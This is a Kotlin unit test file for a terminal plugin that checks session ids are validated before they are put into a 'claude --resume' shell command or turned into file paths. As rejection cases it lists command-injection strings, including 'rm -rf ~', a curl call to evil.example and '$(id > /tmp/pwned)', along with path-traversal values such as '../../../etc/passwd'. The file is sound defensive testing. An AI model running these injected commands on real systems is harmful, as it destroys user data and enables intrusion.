package com.claudetabs

import java.io.File
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder

/**
 * A session id is the one piece of on-disk data this plugin turns into code.
 *
 * Restore types `claude --resume <id>` into a live terminal, and the same id names files
 * under `~/.claude`. Left unvalidated, both are reachable by anything that can write a
 * session file or the restore file:
 *
 *   claude --resume abc$(id > /tmp/pwned); echo      ← runs in your terminal
 *   File(dir, "../../etc/x.json")                    ← escapes the directory
 *
 * and the `--dangerously-skip-permissions` the command may also carry widens it. That needs
 * write access to the home directory, so this is defence in depth rather than a hole anyone
 * can reach remotely — but it is one cheap check on the only field that becomes executable,
 * and the kind of thing that comes back silently if nothing pins it.
 */
class SessionIdSafetyTest {

    @get:Rule val tmp = TemporaryFolder()

    @Test fun acceptsTheIdsClaudeActuallyWrites() {
        assertTrue(ClaudeTabsHelpers.isSafeSessionId("70000002-0000-4000-8000-000000000002"))
        // Not pinned to UUID: the property that matters is "nothing a shell or a path
        // parser treats specially", and pinning would break when the format changes.
        assertTrue(ClaudeTabsHelpers.isSafeSessionId("sid-abc"))
        assertTrue(ClaudeTabsHelpers.isSafeSessionId("session_1.2"))
    }

    @Test fun rejectsShellMetacharacters() {
        for (bad in listOf(
            "abc\$(id > /tmp/pwned); echo",
            "abc; rm -rf ~",
            "abc`whoami`",
            "abc && curl evil.example",
            "abc | tee /tmp/x",
            "abc\nrm -rf ~",
            "abc'\"'\"'",
            "abc \$HOME",
        )) {
            assertFalse("must reject: $bad", ClaudeTabsHelpers.isSafeSessionId(bad))
        }
    }

    @Test fun rejectsPathTraversal() {
        for (bad in listOf("../../../etc/passwd", "..", "a/../b", "dir/sid", "dir\\sid", "/abs/sid")) {
            assertFalse("must reject: $bad", ClaudeTabsHelpers.isSafeSessionId(bad))
        }
    }

    @Test fun rejectsEmptyAndAbsurdlyLong() {
        assertFalse(ClaudeTabsHelpers.isSafeSessionId(null))
        assertFalse(ClaudeTabsHelpers.isSafeSessionId(""))
        assertFalse(ClaudeTabsHelpers.isSafeSessionId("   "))
        assertFalse(ClaudeTabsHelpers.isSafeSessionId("a".repeat(129)))
    }

    /**
     * The lookups that turn an id into a path refuse rather than resolving outside their
     * directory — checked against the filesystem, not just the predicate.
     */
    @Test fun transcriptLookupsRefuseUnsafeIds() {
        val projects = tmp.newFolder("projects")
        File(projects, "-x-proj").mkdirs()
        File(tmp.root, "outside.jsonl").writeText("{}")

        assertNull(ClaudeTabsHelpers.findTranscript(projects, "../outside", null))
        assertFalse(ClaudeTabsHelpers.hasTranscriptAnywhere(projects, "../outside", null))

        // A real id in the same tree still resolves, so the guard isn't just refusing work.
        File(File(projects, "-x-proj"), "good-sid.jsonl").writeText("{}")
        assertTrue(ClaudeTabsHelpers.hasTranscriptAnywhere(projects, "good-sid", null))
    }

    /**
     * The shape of the resume command, pinned here because this is the string that reaches
     * a shell. The id is interpolated bare, which is exactly why it has to be validated
     * before it gets here.
     */
    @Test fun theResumeCommandIsOnlyEverIdAndFlag() {
        val sid = "70000002-0000-4000-8000-000000000002"
        assertTrue(ClaudeTabsHelpers.isSafeSessionId(sid))
        val cmd = "claude --resume $sid"
        assertFalse("no shell metacharacter can survive validation", cmd.any { it in ";|&`$()<>\n" })
    }
}
